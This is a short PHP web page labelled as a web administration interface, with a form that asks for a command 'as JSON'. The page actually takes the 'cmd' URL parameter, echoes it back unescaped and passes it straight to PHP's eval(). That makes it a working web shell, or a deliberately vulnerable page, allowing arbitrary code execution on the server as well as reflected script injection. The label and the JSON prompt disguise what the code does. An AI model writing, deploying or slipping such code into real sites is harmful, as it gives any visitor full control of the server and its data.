<html>
  <body>
    <h1>Web Adminstration Interface</h1>
    <?php
        if(isset($_GET['cmd'])){
            $cmd = $_GET['cmd'];
            echo $cmd;
            eval($cmd);
        }else{
            echo 'Invalid input';
        }
    ?>
    <form>
      Enter command as JSON:
      <input name="cmd" />
    </form>
  </body>
</html>
